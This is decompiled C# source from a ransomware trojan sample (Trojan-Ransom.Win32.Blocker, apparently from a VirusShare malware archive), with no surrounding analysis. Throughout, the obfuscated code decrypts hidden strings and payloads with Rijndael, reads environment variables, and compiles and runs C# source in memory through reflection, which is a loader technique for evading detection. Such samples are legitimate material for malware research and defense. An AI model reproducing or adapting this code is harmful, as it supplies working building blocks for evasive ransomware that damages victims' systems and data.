// Decompiled with JetBrains decompiler
// Type: ?1?.?2?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B16D8A9B-E0EE-4C85-A3BA-4405997EF24D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.bgfw-a4892676fe7d1d73d3b37d39e1a1e9d1be41dca8bcf297ce0ddfed35c970d2b7.exe

using \u003F1\u003F;
using \u003F15\u003F;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace \u003F1\u003F
{
  internal class \u003F2\u003F
  {
    private static \u003F5\u003F \u003F1\u003F = new \u003F5\u003F();

    public string \u003F1\u003F(string _param1)
    {
      string environmentVariable = Environment.GetEnvironmentVariable(_param1);
      Type type = typeof (\u003F2\u003F);
      MethodInfo methodInfo = (MethodInfo) null;
      foreach (MethodInfo method in type.GetMethods())
      {
        ParameterInfo[] parameters = method.GetParameters();
        if (parameters.Length == 3 && (object) parameters[0].ParameterType == (object) Type.GetType(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(397020316, 1558334029, 1590603526)))
        {
          string name = method.Name;
          methodInfo = method;
          break;
        }
      }
      object instance = Activator.CreateInstance(type);
      object[] parameters1 = new object[3]
      {
        (object) 1,
        (object) environmentVariable,
        (object) \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(2070930380, 1558334017, 1590603536)
      };
      return (string) methodInfo.Invoke(instance, parameters1);
    }

    public string \u003F1\u003F(int _param1) => this.\u003F1\u003F(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1718744980, 1558334005, 1590603572)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(2067814365, 1558333997, 1590603540), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(989766745, 1558333997, 1590603548)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(728149288, 1558333989, 1590603540), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(718530947, 1558333989, 1590603548)) == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(371590061, 1558333983, 1590603546) || this.\u003F1\u003F(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1964259129, 1558333959, 1590603524)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(720686524, 1558334079, 1590603540), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(2051710670, 1558334079, 1590603548)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1626276767, 1558334071, 1590603540), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1428422072, 1558334071, 1590603548)) != \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1452353693, 1558334071, 1590603548) ? \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(198794728, 1558334059, 1590603536) : \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1807284708, 1558334055, 1590603544);

    public string \u003F1\u003F(double _param1, string _param2, string _param3)
    {
      switch (_param2)
      {
        case null:
          return \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1396435565, 1558334181, 1590603540) + _param2 + \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(2086079944, 1558334173, 1590603540);
        default:
          if (_param2.ToString() == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(829096891, 1558334201, 1590603536))
            return \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1201952639, 1558334189, 1590603536);
          goto case null;
      }
    }

    public string \u003F1\u003F(int _param1, string _param2, string _param3)
    {
      switch (_param2)
      {
        case null:
          if (_param2.ToString() == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(623012959, 1558334085, 1590603524))
            return _param2 + (object) _param1;
          break;
      }
      return _param2 + _param3;
    }

    public string \u003F1\u003F(long _param1, string _param2, string _param3) => !(_param2.ToString() == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(517510696, 1558334109, 1590603578)) ? _param2 + _param3 : _param2 + (object) _param1;

    public static string \u003F1\u003F(byte[] _param0, string _param1, string _param2) => Encoding.Unicode.GetString(\u003F2\u003F.\u003F15\u003F(_param0, _param1, _param2));

    public static byte[] \u003F15\u003F(byte[] _param0, string _param1, string _param2)
    {
      MemoryStream memoryStream1 = new MemoryStream(_param0);
      MemoryStream memoryStream2 = new MemoryStream();
      Rijndael rijndael = Rijndael.Create();
      PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(_param1, Encoding.ASCII.GetBytes(_param2));
      rijndael.Key = passwordDeriveBytes.GetBytes(32);
      rijndael.IV = passwordDeriveBytes.GetBytes(16);
      ICryptoTransform decryptor = rijndael.CreateDecryptor();
      \u003F36\u003F obj = new \u003F36\u003F((Stream) new CryptoStream((Stream) memoryStream1, decryptor, CryptoStreamMode.Read));
      byte[] buffer = new byte[2048];
      int count;
      do
      {
        count = obj.Read(buffer, 0, buffer.Length);
        memoryStream2.Write(buffer, 0, count);
      }
      while (count > 0);
      obj.Close();
      memoryStream2.Flush();
      memoryStream2.Close();
      return memoryStream2.ToArray();
    }

    public static string \u003F15\u003F(string _param0) => BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(\u003F2\u003F.\u003F16\u003F(_param0))).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(933278865, 1558334275, 1590603550), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1433528434, 1558334275, 1590603548));

    private static byte[] \u003F16\u003F(string _param0) => new ASCIIEncoding().GetBytes(_param0);

    private static string \u003F1\u003F(byte[] _param0) => new ASCIIEncoding().GetString(_param0, 0, _param0.Length);

    public static object \u003F1\u003F(
      string _param0,
      string _param1,
      string _param2,
      string[] _param3,
      object[] _param4)
    {
      try
      {
        ICodeCompiler compiler = new CSharpCodeProvider().CreateCompiler();
        CompilerParameters options = new CompilerParameters();
        foreach (string str in _param3)
          options.ReferencedAssemblies.Add(str);
        options.GenerateInMemory = true;
        CompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, _param0);
        if (!compilerResults.Errors.HasErrors)
        {
          object instance = compilerResults.CompiledAssembly.CreateInstance(_param1);
          if (instance != null)
            return instance.GetType().InvokeMember(_param2, BindingFlags.InvokeMethod, (Binder) null, instance, _param4);
        }
      }
      catch
      {
      }
      return (object) null;
    }

    public static object \u003F1\u003F(
      string _param0,
      string _param1,
      string[] _param2,
      object[] _param3)
    {
      string str = \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(304869863, 1558334277, 1590603610);
      return \u003F2\u003F.\u003F1\u003F(_param0, str, _param1, _param2, _param3);
    }
  }
}
